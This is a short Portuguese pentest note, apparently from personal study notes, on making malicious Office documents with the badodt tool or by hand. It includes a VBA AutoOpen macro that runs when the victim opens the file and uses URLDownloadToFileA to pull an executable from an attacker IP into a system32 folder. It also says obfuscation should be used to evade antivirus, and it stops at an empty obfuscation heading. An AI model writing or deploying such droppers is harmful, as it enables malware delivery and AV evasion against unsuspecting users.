OfficeDocs
========================
Podemos gerar alguns documentos maliciosos com ferramentas tambem, por exemplo:


## Badodt

Nesse link podemos encontrar uma das ferramentas. Devemos nos atentar ao detalhe da extensao do documento (.odt)

<https://github.com/rmdavy/badodf.git>

Necessaria a instalacao da dependencia:

    pip install ezodf

    python badodt.py

![qownnotes-media-qkAioG](../../../media/qownnotes-media-qkAioG.png)

## Manual

Para criar manualmente esses arquivos, podemos fazer da seguinte maneira. Abra o Word. 

Exibir->Macros -> Criar

**Certifique-se de que o nome da funcao seja AutoOpen, dado que ela executara automaticamente quando o arquivo for aberto pelo usuario.**

    Sub AutoOpen()
    End Sub

Alguns exemplos de codigos:

```
Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As Long, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As Long) As Long

Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
    ByVal lpCmdLine As String, _
    ByVal uCmdShow As Long) As Long

Sub AutoOpen()
    URLDownloadToFileA 0, "http://10.8.1.121/backup.exe", "C:\Windows\system32\spool\drivers\color\backup.exe", 0, 0
End Sub
```

Nenhuma dessas opcoes acima sao ofuscadas e provavel que sejam pegas por AVs.

Para isso, devemos utilizar tecnicas de ofuscacao pra evitar a deteccao e delecao dos antivirus do nosso artefato.

## Ofuscacao